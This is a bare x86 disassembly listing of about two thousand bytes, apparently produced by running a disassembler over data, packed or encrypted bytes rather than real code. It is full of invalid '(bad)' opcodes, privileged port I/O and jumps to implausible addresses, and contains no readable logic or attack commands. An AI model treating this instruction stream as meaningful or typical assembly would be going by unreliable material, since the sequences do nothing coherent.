  41206e:	cwde   
  41206f:	ds addr16 dec ecx
  412072:	sbb    cl,BYTE PTR cs:[ebp+0x2c]
  412076:	or     esp,DWORD PTR [ecx+0x40bf5ce6]
  41207c:	jne    0x4120cb
  41207e:	bound  esp,QWORD PTR [esi-0x1ac63370]
  412084:	ret    0x6fd1
  412087:	pop    eax
  412088:	jae    0x4120f3
  41208a:	fwait
  41208b:	dec    ecx
  41208c:	in     al,dx
  41208d:	and    al,0x98
  41208f:	shr    BYTE PTR ds:0x750aa954,cl
  412095:	and    al,0x93
  412097:	mov    ecx,0x2fcbd645
  41209c:	dec    edi
  41209d:	and    al,0x6f
  41209f:	mov    dl,0x18
  4120a1:	fs mov cl,0xc2
  4120a4:	fidiv  DWORD PTR [ebx+edx*2]
  4120a7:	sbb    edx,DWORD PTR [eax+edi*2+0x5a8a26e0]
  4120ae:	into   
  4120af:	xchg   edx,eax
  4120b0:	push   ebx
  4120b1:	mov    bl,0x2a
  4120b3:	ja     0x412087
  4120b5:	jl     0x4120bb
  4120b7:	mov    ds:0x839b5749,al
  4120bc:	lea    esi,[eax-0x7c]
  4120bf:	and    DWORD PTR [esi],ebp
  4120c1:	icebp  
  4120c2:	dec    ebp
  4120c3:	push   edx
  4120c4:	dec    ecx
  4120c5:	mov    edx,0xe8e6ce66
  4120ca:	pushf  
  4120cb:	add    eax,0xb62997d7
  4120d0:	cmp    al,0x37
  4120d2:	mov    bh,0xe4
  4120d4:	inc    edx
  4120d5:	xchg   dx,ax
  4120d7:	in     al,0x4c
  4120d9:	dec    edx
  4120da:	xor    ebx,ecx
  4120dc:	mov    dh,0x42
  4120de:	ret    
  4120df:	nop
  4120e0:	pop    edx
  4120e1:	in     al,dx
  4120e2:	leave  
  4120e3:	adc    BYTE PTR [ecx],0xd6
  4120e6:	cmp    BYTE PTR ds:0x2b51213f,bh
  4120ec:	sti    
  4120ed:	repz test eax,0xad093f69
  4120f3:	popa   
  4120f4:	les    edx,FWORD PTR [edx+0x779b579a]
  4120fa:	dec    ebx
  4120fb:	nop
  4120fc:	adc    eax,0xb0761f88
  412101:	xchg   edi,eax
  412102:	push   edx
  412103:	and    eax,0x29f1092e
  412108:	push   esi
  412109:	sahf   
  41210a:	xor    dh,BYTE PTR [eax+edi*2+0x4d]
  41210e:	cs pop edi
  412110:	dec    edx
  412111:	aam    0xc5
  412113:	popf   
  412114:	stc    
  412115:	sti    
  412116:	into   
  412117:	add    dh,bh
  412119:	sbb    eax,0x439a6ad3
  41211e:	or     BYTE PTR [ebx-0x43],al
  412121:	stos   DWORD PTR es:[edi],eax
  412122:	pop    ds
  412123:	mov    ebx,0xb5fe0e94
  412128:	mov    ch,0x2a
  41212a:	xlat   BYTE PTR ds:[ebx]
  41212b:	ja     0x4120c7
  41212d:	hlt    
  41212e:	pop    ss
  41212f:	mov    ah,0x8d
  412131:	xchg   edx,eax
  412132:	xor    DWORD PTR [eax+0x3e9f06a1],edi
  412138:	in     al,dx
  412139:	adc    BYTE PTR [ebx],dl
  41213b:	pop    ebx
  41213c:	mov    ch,0x7
  41213e:	add    DWORD PTR [edi],edi
  412140:	into   
  412141:	sahf   
  412142:	jmp    0x2aa0eb0a
  412147:	xchg   edi,eax
  412148:	xor    eax,0x992c381
  41214d:	(bad)  
  41214e:	adc    eax,esp
  412150:	push   ds
  412151:	add    eax,0x225e075d
  412156:	xor    edx,DWORD PTR [esp+edx*4-0x23]
  41215a:	mov    esi,0x4c250434
  41215f:	inc    ebx
  412160:	(bad)  
  412161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412162:	es repnz (bad) 
  412165:	and    bl,BYTE PTR [edi+0x66]
  412168:	sub    dh,ch
  41216a:	cmp    al,0xae
  41216c:	push   cs
  41216d:	ja     0x4120f5
  41216f:	jge    0x4121ab
  412171:	enter  0x1391,0xbc
  412175:	cli    
  412176:	push   edx
  412177:	sar    DWORD PTR [edi],0x28
  41217a:	pop    ecx
  41217b:	lods   eax,DWORD PTR ds:[esi]
  41217c:	xor    edi,DWORD PTR [esi+0x318e6c91]
  412182:	xchg   edi,eax
  412183:	iret   
  412184:	rol    DWORD PTR [ebx-0x25],0x46
  412188:	out    0xed,eax
  41218a:	inc    edx
  41218b:	cmc    
  41218c:	lea    ecx,[esi-0x80]
  41218f:	(bad)  
  412190:	cmp    eax,0xf7d1224f
  412195:	jecxz  0x41218a
  412197:	jp     0x41211e
  412199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41219a:	cdq    
  41219b:	push   ds
  41219c:	mov    ch,0x3e
  41219e:	inc    edx
  41219f:	test   eax,0x941b7724
  4121a4:	data16 xchg BYTE PTR [ebx+0x64],al
  4121a8:	iret   
  4121a9:	mov    ch,0x71
  4121ab:	cli    
  4121ac:	(bad)  
  4121ad:	and    ebp,esp
  4121af:	iret   
  4121b0:	xlat   BYTE PTR ds:[ebx]
  4121b1:	pusha  
  4121b2:	pop    ebx
  4121b3:	cmp    eax,0x43dd473
  4121b8:	mov    bl,0x1f
  4121ba:	stos   DWORD PTR es:[edi],eax
  4121bb:	jae    0x412189
  4121bd:	xor    ch,BYTE PTR [eiz*4-0x55738817]
  4121c4:	pop    ebx
  4121c5:	add    eax,esi
  4121c7:	mov    ecx,DWORD PTR [ebx+eax*4-0x23]
  4121cb:	dec    DWORD PTR [edi-0x448d7ae1]
  4121d1:	inc    eax
  4121d2:	out    0x8c,al
  4121d4:	aas    
  4121d5:	into   
  4121d6:	je     0x412195
  4121d8:	mov    ah,0x74
  4121da:	dec    esp
  4121db:	pop    esp
  4121dc:	jle    0x4121f9
  4121de:	shr    BYTE PTR [eax-0x696e902b],1
  4121e4:	fwait
  4121e5:	ret    0xdf5f
  4121e8:	cmp    al,0xfa
  4121ea:	and    ah,0x7d
  4121ed:	scas   al,BYTE PTR es:[edi]
  4121ee:	mov    ds:0x4fbcf823,eax
  4121f3:	aad    0xff
  4121f5:	std    
  4121f6:	mov    eax,0x9816e8c
  4121fb:	dec    ecx
  4121fc:	inc    edx
  4121fd:	or     DWORD PTR [edi],ecx
  4121ff:	add    esp,DWORD PTR [ebp+0x75a23d8f]
  412205:	xchg   ebp,eax
  412206:	dec    ebp
  412207:	cmp    eax,0x8dcaffd4
  41220c:	sub    eax,0xf80f2
  412211:	dec    ecx
  412212:	(bad)  
  412213:	xlat   BYTE PTR ds:[ebx]
  412214:	push   cs
  412215:	(bad)  
  412217:	mov    bh,0xd9
  412219:	imul   edx,DWORD PTR [ebp+0x6069b05f],0x45
  412220:	in     eax,0xeb
  412222:	xor    al,BYTE PTR [ebx+0x37300d09]
  412228:	cmp    al,0x41
  41222a:	rcl    BYTE PTR [edx-0x44],1
  41222d:	aas    
  41222e:	push   ss
  41222f:	nop
  412230:	jmp    0x560e7296
  412235:	ins    BYTE PTR es:[edi],dx
  412236:	mov    WORD PTR [edx-0x754e0549],ds
  41223c:	dec    ebp
  41223d:	add    esi,ecx
  41223f:	pop    ebp
  412240:	rol    DWORD PTR [esi],cl
  412242:	dec    ebp
  412243:	mov    ch,0xa3
  412245:	ror    BYTE PTR [edi-0x11],cl
  412248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412249:	rcr    BYTE PTR [edx],cl
  41224b:	dec    eax
  41224c:	dec    ebp
  41224d:	add    al,0xf7
  41224f:	mov    ds:0xc076feb7,eax
  412254:	inc    eax
  412255:	inc    edi
  412256:	cmp    edx,DWORD PTR [ecx-0x1fabb924]
  41225c:	rcr    DWORD PTR [eax+0x4f],0x69
  412260:	xor    BYTE PTR [edi+0x2985b13d],ch
  412266:	xlat   BYTE PTR ds:[ebx]
  412267:	push   ebx
  412268:	fidivr WORD PTR [edx]
  41226a:	or     eax,0x2ee2a5c7
  41226f:	(bad)  [eax+ecx*1+0x7097ae6f]
  412276:	dec    esi
  412277:	and    BYTE PTR [edi-0x6489fc22],dh
  41227d:	mov    ch,0xf4
  41227f:	adc    esp,DWORD PTR [eax+0xbc38f88]
  412285:	aas    
  412286:	(bad)  
  412287:	mov    edi,0x931cb6e
  41228c:	mov    dh,0x6d
  41228e:	cmp    eax,0x9465ea62
  412293:	push   ss
  412294:	movaps XMMWORD PTR [ebp-0x34708ecf],xmm3
  41229b:	xchg   BYTE PTR [edi+0x2f1278b1],ah
  4122a1:	int3   
  4122a2:	arpl   dx,dx
  4122a4:	(bad)  
  4122a5:	xchg   ebx,eax
  4122a6:	cmp    al,0xee
  4122a8:	test   BYTE PTR [ebx+ebp*1+0x75c29efe],cl
  4122af:	fidivr DWORD PTR ds:0x113a9d1d
  4122b5:	rol    BYTE PTR [ebx],1
  4122b7:	or     DWORD PTR [esi+eiz*1-0x29ce5335],0x2f
  4122bf:	adc    al,0xbb
  4122c1:	in     eax,dx
  4122c2:	and    BYTE PTR [ecx+0x6d],0x84
  4122c6:	enter  0xcd89,0x79
  4122ca:	stos   BYTE PTR es:[edi],al
  4122cb:	in     al,dx
  4122cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122cd:	xor    eax,0x1b326c5c
  4122d2:	sti    
  4122d3:	inc    esi
  4122d4:	dec    ecx
  4122d5:	sbb    al,BYTE PTR [edi+ecx*4+0x3ccfb7d0]
  4122dc:	push   ss
  4122dd:	cmp    eax,0x2f4ca6ee
  4122e2:	push   ecx
  4122e3:	fidivr WORD PTR [edi+0xd]
  4122e6:	sbb    bh,dl
  4122e8:	imul   ebp,edi,0xffffff93
  4122eb:	shl    ebx,1
  4122ed:	sti    
  4122ee:	dec    esi
  4122ef:	icebp  
  4122f0:	imul   ebp,DWORD PTR [edx+0x3b7c9c86],0xfffffffe
  4122f7:	repz imul esi,DWORD PTR [ecx-0x5b79603c],0xc434cc1c
  412302:	sub    BYTE PTR [ebp+0x5a9ab17a],cl
  412308:	push   esp
  412309:	sub    eax,0x8669ca27
  41230e:	adc    eax,0x87db48a1
  412313:	out    dx,al
  412314:	ret    0xa1d1
  412317:	fbstp  TBYTE PTR [eax-0x65f9c74d]
  41231d:	call   DWORD PTR [ecx+0x8]
  412320:	fld    TBYTE PTR [eax]
  412322:	out    0x5,eax
  412324:	adc    bl,bl
  412326:	lahf   
  412327:	nop
  412328:	cdq    
  412329:	xor    eax,0x24b212d2
  41232e:	or     DWORD PTR [eax],0x6c7598fa
  412334:	lods   eax,DWORD PTR ds:[esi]
  412335:	out    dx,eax
  412336:	mov    esp,DWORD PTR [edx-0x78]
  412339:	dec    edx
  41233a:	int    0x67
  41233c:	jns    0x412323
  41233e:	lea    ecx,[ebx+0x7ffa97dc]
  412344:	stos   BYTE PTR es:[edi],al
  412345:	cwde   
  412346:	mov    ds:0x81b36ab9,al
  41234b:	pop    ds
  41234c:	nop
  41234d:	pop    esp
  41234e:	out    dx,al
  41234f:	xchg   ah,cl
  412351:	stos   DWORD PTR es:[edi],eax
  412352:	xor    DWORD PTR [ebx-0x44002897],edi
  412358:	cdq    
  412359:	(bad)  
  41235a:	jbe    0x412346
  41235c:	xchg   ebx,eax
  41235d:	(bad)  
  41235e:	jmp    0x412302
  412360:	pusha  
  412361:	push   esp
  412362:	jne    0x41231b
  412364:	sbb    dh,BYTE PTR [ebx+0x5a]
  412367:	out    0x7,al
  412369:	cmovns ecx,esp
  41236c:	stos   DWORD PTR es:[edi],eax
  41236d:	in     al,0xb7
  41236f:	das    
  412370:	mov    al,ds:0x46c599a6
  412375:	frstor [ebx-0x36a74781]
  41237b:	nop
  41237c:	bnd call 0x9b74d311
  412382:	das    
  412383:	adc    dh,ah
  412385:	xor    al,0x42
  412387:	adc    BYTE PTR [esi],bh
  412389:	xchg   edi,eax
  41238a:	dec    eax
  41238b:	jmp    0x2c21:0xb8d90699
  412392:	xchg   esp,eax
  412393:	test   BYTE PTR [esi+0x2],ch
  412396:	mov    esi,0x36d6de1a
  41239b:	jle    0x41238f
  41239d:	dec    ebp
  41239e:	jne    0x412372
  4123a0:	or     bh,BYTE PTR fs:0x8850cc9f
  4123a7:	push   ebp
  4123a8:	outs   dx,BYTE PTR ds:[esi]
  4123a9:	ss cmp dl,ch
  4123ac:	mov    ebx,0x6bca3388
  4123b1:	dec    esp
  4123b2:	shl    DWORD PTR [esi+ebp*8+0x60c28e3a],1
  4123b9:	jno    0x4123ad
  4123bb:	xchg   BYTE PTR [edi-0x2a],cl
  4123be:	inc    ebx
  4123bf:	(bad)  
  4123c0:	mov    bh,0xe6
  4123c2:	daa    
  4123c3:	aam    0x7
  4123c5:	and    ah,0x3d
  4123c8:	mov    al,0xcc
  4123ca:	inc    esp
  4123cb:	jne    0x4123e7
  4123cd:	xor    ch,BYTE PTR [ebp-0x3850ebc9]
  4123d3:	movlps xmm3,QWORD PTR [ebp-0x6b]
  4123d7:	adc    bl,ah
  4123d9:	popf   
  4123da:	mov    ah,0xd6
  4123dc:	dec    edi
  4123dd:	and    dl,BYTE PTR ds:0xec67bd91
  4123e3:	mov    ebx,esp
  4123e5:	mov    esi,0xd588bc1e
  4123ea:	sbb    bl,0x65
  4123ed:	jmp    0xeb587245
  4123f2:	adc    ebx,ecx
  4123f4:	push   esi
  4123f5:	mov    ch,BYTE PTR [ecx]
  4123f7:	xor    bh,BYTE PTR [esi+0x10]
  4123fa:	cli    
  4123fb:	cmp    ah,BYTE PTR [ebx+0x4ac6f5a3]
  412401:	and    eax,0x54b22418
  412406:	mov    bh,0x31
  412408:	sbb    al,BYTE PTR [edi+0x6d]
  41240b:	cmp    BYTE PTR [esi],ah
  41240d:	lock popa 
  41240f:	das    
  412410:	test   BYTE PTR [ebx+0x2ba993bd],dh
  412416:	retf   
  412417:	cmp    al,0x64
  412419:	cli    
  41241a:	pop    es
  41241b:	les    ecx,FWORD PTR [esi]
  41241d:	jns    0x412427
  41241f:	cmp    DWORD PTR [eax-0x7116d1b6],0x7d
  412426:	mov    esi,0xb9ae0c22
  41242b:	mov    ebx,0x4c559dff
  412430:	ss jmp 0xf8673a5b
  412436:	cmp    BYTE PTR [esi-0x11],0xef
  41243a:	push   eax
  41243b:	pop    ss
  41243c:	xor    al,0xae
  41243e:	addr16 cs enter 0xb7ca,0x7e
  412444:	mov    al,0x53
  412446:	dec    eax
  412447:	enter  0x8b79,0xfe
  41244b:	xchg   edi,eax
  41244c:	leave  
  41244d:	cld    
  41244e:	mov    ds:0xcb64bba4,eax
  412453:	(bad)  
  412454:	mov    al,ds:0xe936bbd6
  412459:	(bad)  
  41245a:	cmp    al,0xfa
  41245c:	xlat   BYTE PTR ds:[ebx]
  41245d:	xor    eax,DWORD PTR [edx]
  41245f:	retf   0x45da
  412462:	inc    BYTE PTR [esi+edi*8]
  412465:	call   0x51511df1
  41246a:	fsubr  st(7),st
  41246c:	cmp    DWORD PTR [edx+0x63c26470],0x5
  412473:	mov    edx,0x7b919f0c
  412478:	xchg   esp,ebp
  41247a:	push   0x1ac64676
  41247f:	pop    ds
  412480:	aam    0x8
  412482:	sub    eax,0xccc44051
  412487:	xorps  xmm7,XMMWORD PTR [eax+0x14]
  41248b:	lea    ecx,[edi+0x43199c2]
  412491:	or     esi,eax
  412493:	out    dx,al
  412494:	dec    esp
  412495:	inc    ebp
  412496:	jg     0x412455
  412498:	inc    edi
  412499:	aam    0x7b
  41249b:	pop    edx
  41249c:	ret    
  41249d:	xor    BYTE PTR [ebx+esi*8-0x35],dh
  4124a1:	and    esi,ebp
  4124a3:	fidivr DWORD PTR [eax+0x6f8c17c1]
  4124a9:	sbb    DWORD PTR [edx+0x4849d30a],0xffffffd0
  4124b0:	mov    al,ds:0x1d44fbb1
  4124b5:	push   esp
  4124b6:	sbb    BYTE PTR [edi-0x4e],0x2a
  4124ba:	test   DWORD PTR [ecx+0x7e],eax
  4124bd:	mov    dh,0xc9
  4124bf:	cmp    bh,BYTE PTR [ecx+edi*4+0x1e3ab0f5]
  4124c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124c7:	and    ecx,DWORD PTR [edx-0x21da0f2f]
  4124cd:	test   eax,0x3ba15ffa
  4124d2:	fcom   QWORD PTR [edi+0x79]
  4124d5:	das    
  4124d6:	fmul   QWORD PTR [ecx]
  4124d8:	xrelease xchg BYTE PTR [ebx-0x312b07c0],ah
  4124df:	or     cl,BYTE PTR [edi]
  4124e1:	cmp    ebp,esi
  4124e3:	push   ss
  4124e4:	pop    esi
  4124e5:	cmp    esp,DWORD PTR [ecx+eiz*2-0x50]
  4124e9:	adc    BYTE PTR [ebp+0x249983a9],cl
  4124ef:	mov    dh,0xfe
  4124f1:	push   ecx
  4124f2:	mov    fs,WORD PTR [ebx-0x17]
  4124f5:	jg     0x4124bd
  4124f7:	xchg   BYTE PTR [ecx+0x673b9047],dh
  4124fd:	dec    edi
  4124fe:	inc    ecx
  4124ff:	and    esi,DWORD PTR [esi-0x4]
  412502:	(bad)  
  412503:	ins    DWORD PTR es:[edi],dx
  412504:	shr    bl,1
  412506:	pop    ds
  412507:	push   ds
  412508:	fwait
  412509:	mov    esp,0x1d3d4861
  41250e:	mov    ah,BYTE PTR [ecx]
  412510:	ss aas 
  412512:	sbb    al,BYTE PTR [eax]
  412514:	mov    al,ds:0xcbd68a1f
  412519:	int    0x5
  41251b:	sar    ebp,cl
  41251d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41251e:	mov    esi,0xfbb71117
  412523:	xor    al,0xef
  412525:	mov    ds:0x67af3a90,al
  41252a:	mov    al,ds:0x96e8faac
  41252f:	inc    edi
  412530:	cmp    DWORD PTR [edi+eiz*4+0x20],ebp
  412534:	jecxz  0x41253c
  412536:	(bad)  
  412537:	lods   al,BYTE PTR ds:[esi]
  412538:	dec    edx
  412539:	xlat   BYTE PTR ds:[ebx]
  41253a:	mov    ebp,0x8a81691e
  41253f:	sbb    al,0x41
  412541:	idiv   edx
  412543:	lock stos BYTE PTR es:[edi],al
  412545:	test   eax,0x9f905e80
  41254a:	sub    BYTE PTR [ebx-0x3a],cl
  41254d:	dec    edi
  41254e:	(bad)  
  41254f:	cmp    esi,DWORD PTR [ebx+eax*1]
  412552:	inc    eax
  412553:	stos   BYTE PTR es:[edi],al
  412554:	dec    esp
  412555:	imul   esi,DWORD PTR [ecx],0xffffff89
  412558:	mov    al,ds:0x6a183e0f
  41255d:	outs   dx,BYTE PTR ds:[esi]
  41255e:	fs mov cs,edi
  412561:	adc    esp,DWORD PTR [ebx+ebp*1+0x11b52465]
  412568:	mov    ds:0xd37dcc70,al
  41256d:	sub    BYTE PTR [edi-0x379cb3ae],al
  412573:	mov    ebp,0xe56e333a
  412578:	fmul   st,st(5)
  41257a:	add    eax,0x150866eb
  41257f:	imul   edx,ebx,0x3693e89d
  412585:	adc    al,0x2b
  412587:	imul   edx,DWORD PTR [edx+0x7],0x9f2b49f9
  41258e:	lds    eax,FWORD PTR [edi+eax*2+0x76]
  412592:	repz cli 
  412594:	mov    dh,0xef
  412596:	ss push ds
  412598:	outs   dx,BYTE PTR ds:[esi]
  412599:	sti    
  41259a:	cdq    
  41259b:	fdiv   QWORD PTR [ebp+0x15]
  41259e:	in     eax,dx
  41259f:	ds push eax
  4125a1:	dec    esp
  4125a2:	inc    edi
  4125a3:	call   0x6d8ee8c7
  4125a8:	mov    esp,0xd2954ce8
  4125ad:	cwde   
  4125ae:	inc    edi
  4125af:	xchg   DWORD PTR [eax-0x6],edx
  4125b2:	stos   DWORD PTR es:[edi],eax
  4125b3:	push   es
  4125b4:	clc    
  4125b5:	out    0x14,al
  4125b7:	add    DWORD PTR [edx+ebp*8],eax
  4125ba:	adc    BYTE PTR [esi+eax*2-0x3ff2884d],ch
  4125c1:	lea    eax,[esi+ebp*4]
  4125c4:	icebp  
  4125c5:	or     al,BYTE PTR [ebp+0x2680d9e2]
  4125cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125cc:	mov    eax,ds:0xacbd5f38
  4125d1:	sar    DWORD PTR [edx],cl
  4125d3:	sbb    cl,BYTE PTR [ebp-0x27]
  4125d6:	pop    es
  4125d7:	repz (bad) 
  4125d9:	fs mov esi,0x7a21661e
  4125df:	pop    esp
  4125e0:	ficom  DWORD PTR [ebx-0x79c046dc]
  4125e6:	adc    al,0x6c
  4125e8:	sbb    BYTE PTR [edx+0x45ca72f5],0xc1
  4125ef:	push   eax
  4125f0:	mov    eax,0x9eb6d20e
  4125f5:	not    DWORD PTR [ecx+0x35412076]
  4125fb:	add    al,0xbe
  4125fd:	cwde   
  4125fe:	rcr    DWORD PTR [ebp-0x2de4fcdd],cl
  412604:	ffreep st(1)
  412606:	pop    eax
  412607:	data16 fist DWORD PTR [edx+0x16]
  41260b:	icebp  
  41260c:	pop    ecx
  41260d:	(bad)  
  41260e:	into   
  41260f:	sar    ah,1
  412611:	cmp    esi,DWORD PTR [ecx+0x79186747]
  412617:	mov    ch,0xb8
  412619:	hlt    
  41261a:	pop    ebp
  41261b:	daa    
  41261c:	inc    eax
  41261d:	cli    
  41261e:	aam    0xeb
  412620:	mov    BYTE PTR [edi],0x64
  412623:	dec    esp
  412624:	pop    eax
  412625:	xlat   BYTE PTR ds:[ebx]
  412626:	mov    dl,0x8e
  412628:	(bad)  
  41262a:	cld    
  41262b:	or     al,al
  41262d:	mov    al,0x6a
  41262f:	push   edx
  412630:	sub    cl,BYTE PTR [ecx+0x1822496f]
  412636:	out    0x87,eax
  412638:	aas    
  412639:	pop    esi
  41263a:	mov    dl,0x72
  41263c:	add    ecx,DWORD PTR [ecx]
  41263e:	sub    bl,ah
  412640:	std    
  412641:	xor    DWORD PTR [ecx+0x4fb67290],esi
  412647:	(bad)  
  412648:	in     al,dx
  412649:	lahf   
  41264a:	adc    al,0x92
  41264c:	cmp    esi,esi
  41264e:	mov    eax,DWORD PTR [ebp+0x110c7aa0]
  412654:	sub    eax,0x3535520e
  412659:	xor    bl,BYTE PTR [esi]
  41265b:	ret    0x1fcb
  41265e:	lea    esp,[edi+edi*2-0x51]
  412662:	mov    bh,ch
  412664:	and    DWORD PTR [ebp+0x3f49613d],esi
  41266a:	add    DWORD PTR [eax+ecx*1],ebp
  41266d:	xchg   esp,eax
  41266e:	dec    ebx
  41266f:	sbb    ch,BYTE PTR [edx+0x31af701c]
  412675:	stos   DWORD PTR es:[edi],eax
  412676:	push   0x71
  412678:	arpl   WORD PTR [edx],bx
  41267a:	mov    esp,0x59f13baa
  41267f:	lock or al,0x9f
  412682:	xchg   bh,dh
  412684:	sub    eax,0x8605a31a
  412689:	mov    ds:0xeec0fd2d,eax
  41268e:	sar    al,cl
  412690:	fs mov cl,0xa4
  412693:	out    dx,al
  412694:	test   BYTE PTR [ebp-0x36],al
  412697:	sbb    eax,0x87837689
  41269c:	ficomp DWORD PTR [edi+0x769934a7]
  4126a2:	jmp    FWORD PTR [ebx*1+0x6e19244d]
  4126a9:	pop    es
  4126aa:	fdiv   DWORD PTR [edx-0x57]
  4126ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ae:	cs jp  0x412672
  4126b1:	mov    ds:0xf9be6532,eax
  4126b6:	dec    edx
  4126b7:	stc    
  4126b8:	call   0xce9787ac
  4126bd:	stc    
  4126be:	addr16 jo 0x412686
  4126c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126c2:	stos   DWORD PTR es:[edi],eax
  4126c3:	xlat   BYTE PTR ds:[ebx]
  4126c4:	ror    BYTE PTR [ebx+eiz*8+0x2483ff09],0x77
  4126cc:	stc    
  4126cd:	pop    ecx
  4126ce:	xchg   ebp,eax
  4126cf:	mov    bh,0xf7
  4126d1:	mov    ds:0x69d6149f,al
  4126d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d7:	je     0x41265a
  4126d9:	fcom   st(7)
  4126db:	retf   
  4126dc:	lock mov ecx,0x26860a09
  4126e2:	outs   dx,DWORD PTR ds:[esi]
  4126e3:	mov    esi,0xf6ab85d
  4126e8:	add    esi,ebp
  4126ea:	cwde   
  4126eb:	and    esi,esp
  4126ed:	in     al,0xfa
  4126ef:	cmp    al,bh
  4126f1:	sbb    DWORD PTR [esi+0xe35df40],ebp
  4126f7:	dec    ecx
  4126f8:	jg     0x4126ad
  4126fa:	scas   eax,DWORD PTR es:[edi]
  4126fb:	adc    al,0x8c
  4126fd:	xchg   ecx,eax
  4126fe:	mov    eax,0xea501345
  412703:	and    BYTE PTR [edx+0x37a9a51b],ah
  412709:	loopne 0x4126d9
  41270b:	xchg   ebp,eax
  41270c:	pop    esi
  41270d:	push   ds
  41270e:	pushf  
  41270f:	sbb    BYTE PTR [esp+ebx*4+0x61],cl
  412713:	pop    ebp
  412714:	dec    ecx
  412715:	test   BYTE PTR [esi],ah
  412717:	mov    bh,0x99
  412719:	mov    ds:0xbeca9ff,al
  41271e:	aad    0xd
  412720:	(bad)  
  412721:	jle    0x412719
  412723:	scas   al,BYTE PTR es:[di]
  412725:	ins    BYTE PTR es:[edi],dx
  412726:	sti    
  412727:	ins    DWORD PTR es:[edi],dx
  412728:	call   0x9d272c17
  41272d:	push   ss
  41272e:	(bad)  
  41272f:	rcl    DWORD PTR [esi],cl
  412731:	or     DWORD PTR [edi-0x38],edi
  412734:	bound  ebx,QWORD PTR [ebx]
  412736:	xchg   edx,eax
  412737:	xchg   esi,eax
  412738:	cwde   
  412739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41273a:	sub    BYTE PTR [ecx],al
  41273c:	and    al,0xfe
  41273e:	daa    
  41273f:	std    
  412740:	pushf  
  412741:	adc    DWORD PTR [eax+0x56],0xb07688af
  412748:	add    eax,0x54d509dd
  41274d:	mov    al,ds:0x5dadae05
  412752:	mov    ebx,0x4cf952b7
  412757:	sahf   
  412758:	jg     0x4127ad
  41275a:	push   cs
  41275b:	popf   
  41275c:	shl    BYTE PTR [edi-0x3b],cl
  41275f:	xchg   edi,eax
  412760:	cli    
  412761:	leave  
  412762:	rcl    DWORD PTR [edi+eiz*2-0x15],1
  412766:	stos   DWORD PTR es:[edi],eax
  412767:	xor    DWORD PTR [ebx],0x16527b4c
  41276d:	ins    DWORD PTR es:[edi],dx
  41276e:	iret   
  41276f:	scas   eax,DWORD PTR es:[edi]
  412770:	stos   DWORD PTR es:[edi],eax
  412771:	std    
  412772:	sub    DWORD PTR [ebp+0x1c],ecx
  412775:	(bad)  
  412776:	in     al,dx
  412777:	cld    
  412778:	or     eax,0xce0bd442
  41277d:	or     eax,edx
  41277f:	or     ebp,esi
  412781:	scas   al,BYTE PTR es:[edi]
  412782:	fnstcw WORD PTR [edx+0x5d9e26]
  412788:	dec    edx
  412789:	jp     0x412799
  41278b:	(bad)  
  41278c:	sti    
  41278d:	or     BYTE PTR [esi],bh
  41278f:	and    al,0x11
  412791:	in     al,dx
  412792:	or     eax,0xc6f5310f
  412797:	iret   
  412798:	jg     0x4127f3
  41279a:	mov    dl,0x25
  41279c:	xchg   ecx,eax
  41279d:	call   0xc2d3:0xd52b4275
  4127a4:	xor    ecx,ebx
  4127a6:	jg     0x41280a
  4127a8:	or     eax,0x22966b14
  4127ad:	mov    ebx,0xb3e3e7bc
  4127b2:	cs leave 
  4127b4:	mov    ebp,0xfccb0af5
  4127b9:	scas   al,BYTE PTR es:[edi]
  4127ba:	retf   0x2ba3
  4127bd:	mov    dh,al
  4127bf:	ret    0x955a
  4127c2:	int3   
  4127c3:	fldcw  WORD PTR [ebp-0x698a1126]
  4127c9:	add    cl,BYTE PTR [edi-0x31f56a40]
  4127cf:	mov    dh,dh
  4127d1:	popf   
  4127d2:	dec    edx
  4127d3:	call   DWORD PTR [eax+0x358e6f2c]
  4127d9:	out    dx,eax
  4127da:	pop    ebx
  4127db:	adc    DWORD PTR [ecx],esp
  4127dd:	push   0x44295483
  4127e2:	add    ch,dl
  4127e4:	xchg   DWORD PTR [ebx+ecx*4-0x2c],esp
  4127e8:	mov    WORD PTR [edi],?
  4127ea:	sar    BYTE PTR [esi+edi*8+0x50c009f8],1
  4127f1:	adc    al,0x3e
  4127f3:	dec    esp
  4127f4:	ss push ebp
  4127f6:	out    dx,al
  4127f7:	mov    ebp,ecx
  4127f9:	xor    cl,al
  4127fb:	and    BYTE PTR [edi+0x41],ch
  4127fe:	call   0x6f89:0x2fdefa96
  412805:	mov    al,0x67
  412807:	out    dx,eax
  412808:	rcl    DWORD PTR cs:[eax+0x3a18d48f],cl
  41280f:	inc    edx
  412810:	retf   0x85f9
  412813:	push   ebx
  412814:	pop    edx
  412815:	iret   
  412816:	xchg   esi,eax
  412817:	fdivp  st(4),st
  412819:	sbb    ecx,edi
  41281b:	sbb    al,0xbe
  41281d:	rcl    BYTE PTR [ecx-0x2f74ab1c],0x72
  412824:	rcr    DWORD PTR [edx+esi*4],cl
  412827:	in     eax,0xec
  412829:	test   esp,eax
  41282b:	mov    eax,ds:0x1993bbf9
  412830:	cld    
  412831:	hlt    
  412832:	push   eax
  412833:	pop    edi
  412834:	adc    eax,0x3c4f84d7
  412839:	add    al,0xf1
  41283b:	ds ret 0xe3da
  41283f:	pop    ecx
  412840:	adc    eax,0x48b25fb5
  412845:	cmp    al,0xf1
  412847:	loop   0x412893
  412849:	xchg   esp,eax
  41284a:	cmp    eax,0xef96fe80
  41284f:	adc    esi,ebp
  412851:	dec    esp
  412852:	pop    ebp
  412853:	jnp    0x4128d1
  412855:	hlt    
  412856:	adc    eax,0x7f72bc66
  41285b:	into   
  41285c:	fwait
  41285d:	or     cl,BYTE PTR [edi-0x11]
  412860:	int3   
  412861:	push   ecx
  412862:	stos   BYTE PTR es:[edi],al
  412863:	push   ecx
  412864:	sub    al,0x4d
  412866:	ror    DWORD PTR [ecx+0x2],1
  412869:	clc    
  41286a:	push   ebp
  41286b:	ins    BYTE PTR es:[edi],dx
  41286c:	or     esp,esp
